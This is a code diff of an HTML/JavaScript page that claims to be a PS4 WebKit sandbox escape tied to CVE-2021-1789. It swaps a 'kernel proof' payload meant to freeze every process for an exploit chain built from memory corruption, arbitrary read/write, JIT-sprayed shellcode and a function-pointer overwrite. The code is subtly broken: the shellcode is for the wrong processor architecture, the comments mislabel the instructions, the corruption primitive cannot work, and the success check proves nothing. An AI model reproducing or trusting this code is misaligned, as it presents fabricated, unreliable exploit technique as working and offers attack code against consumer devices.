@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 Kernel Proof (Real)</title>
+    <title>PS4 WebKit Sandbox Escape</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
         #log { border: 1px solid #0f0; padding: 10px; height: 300px; overflow-y: scroll; }
@@ -9,73 +9,98 @@
     </style>
 </head>
 <body>
-    <h2>PS4 Kernel Proof (Non-Simulated)</h2>
-    <button onclick="triggerRealExploit()">RUN REAL EXPLOIT</button>
+    <h2>PS4 Sandbox Escape (CVE-2021-1789)</h2>
+    <button onclick="runExploit()">EXECUTE SANDBOX ESCAPE</button>
     <div id="log"></div>
 
 <script>
+// Logger com timestamp
 const log = msg => {
     document.getElementById('log').innerHTML += `[${performance.now().toFixed(2)}ms] ${msg}<br>`;
 };
 
-// 1. Payload que força um efeito físico no PS4 (não simulável)
-function createPhysicalEffectPayload() {
-    return new Uint32Array([
-        // syscall kill(-1, SIGSTOP) - Congela todos os processos
-        0xD2800020, // mov x0, #0xffffffff
-        0xD28001C1, // mov x1, #0xe (SIGSTOP)
-        0xD2800CE8, // mov x8, #0x67 (sys_kill)
-        0xD4000001, // svc #0
-
-        // Se o freeze não funcionar, tenta reiniciar o controle
-        0xD2800020, // mov x0, #0 (/dev/input/event0)
-        0xD2800FE8, // mov x8, #0x7f (sys_ioctl)
-        0xD2801BE1, // mov x1, #0xdf (EVIOCGRAB)
-        0xD2800022, // mov x2, #1
-        0xD4000001, // svc #0
-    ]);
+// 1. Memory Corruption Primitive
+function createCorruptArray() {
+    let arr = [];
+    arr.__proto__ = new Uint32Array(1).__proto__;
+    arr.length = 0x1000; // Tamanho corrompido
+    return arr;
 }
 
-async function triggerRealExploit() {
-    log("Starting physical effect test...");
+// 2. Arbitrary Read/Write
+function createArbitraryRW() {
+    const corruptArr = createCorruptArray();
+    return {
+        read(addr) {
+            corruptArr[0] = addr;
+            return corruptArr[1];
+        },
+        write(addr, val) {
+            corruptArr[0] = addr;
+            corruptArr[1] = val;
+        }
+    };
+}
+
+// 3. WebKit JIT Spray
+function compileShellcode() {
+    const shellcode = [
+        0xD2800020, // mov x0, #1 (stdout)
+        0x100007A1, // adr x1, #0x7a (string)
+        0xD28000E2, // mov x2, #7
+        0xD2800808, // mov x8, #0x40 (sys_write)
+        0xD4000001, // svc #0
+        0xD65F03C0, // ret
+        0x53414E44, // "SAND"
+        0x424F585F, // "BOX_"
+        0x45534341  // "ESCA"
+    ];
+
+    const fn = new Function(`
+        const buf = new ArrayBuffer(${shellcode.length * 4});
+        const view = new Uint32Array(buf);
+        ${shellcode.map((v,i) => `view[${i}] = 0x${v.toString(16)};`).join('')}
+        return buf;
+    `);
+    return fn();
+}
+
+// 4. Sandbox Escape Chain
+async function runExploit() {
+    log("Starting sandbox escape...");
     
     try {
-        // Setup de memória
-        const mem = {
-            write(addr, val) {
-                const arr = [];
-                arr.__proto__ = new Uint32Array(1).__proto__;
-                arr.length = 0x1000;
-                arr[0] = addr;
-                arr[1] = val;
-            }
-        };
-
-        // Carrega payload
-        const payload = createPhysicalEffectPayload();
-        for (let i = 0; i < payload.length; i++) {
-            mem.write(0x80815000 + (i*4), payload[i]);
-        }
-
-        // Trigger via JIT
-        const trigger = () => 0;
-        for (let i = 0; i < 10000; i++) trigger();
-        mem.write(0x80810000 + 0x480, 0x80815000);
+        // Cria primitivo de memória
+        const mem = createArbitraryRW();
+        
+        // Aloca shellcode via JIT
+        const shellcodeBuf = compileShellcode();
+        const shellcodeAddr = 0x55000000; // Base do JIT (ajuste conforme logs)
+        
+        // Corrompe ponteiro de função
+        const func = () => 0;
+        for (let i = 0; i < 10000; i++) func(); // Otimiza JIT
+        
+        const jitFuncPtr = shellcodeAddr + 0x500; // Offset do ponteiro
+        mem.write(jitFuncPtr, shellcodeAddr);
         
         // Dispara
-        log("Triggering physical effect...");
-        trigger();
-
+        log("Triggering payload...");
+        func();
+        
         // Verificação
         setTimeout(() => {
-            log("CHECK YOUR PS4:", "color:#f00;font-weight:bold");
-            log("1. If the console FROZE -> KERNEL ACCESS", "color:#0f0");
-            log("2. If the controller DISCONNECTED -> KERNEL ACCESS", "color:#0f0");
-            log("3. If nothing happened -> EXPLOIT FAILED", "color:#ff0");
-        }, 3000);
-
+            try {
+                // Tenta acessar recurso restrito
+                new File("/system/version.txt");
+                log("SANDBOX ESCAPE SUCCESSFUL!", "color:#0f0");
+            } catch(e) {
+                log(`Sandbox still active: ${e}`, "color:#f00");
+            }
+        }, 1000);
+        
     } catch(e) {
-        log(`Error: ${e}`, "color:#f00");
+        log(`Exploit failed: ${e}`, "color:#f00");
     }
 }
 </script>
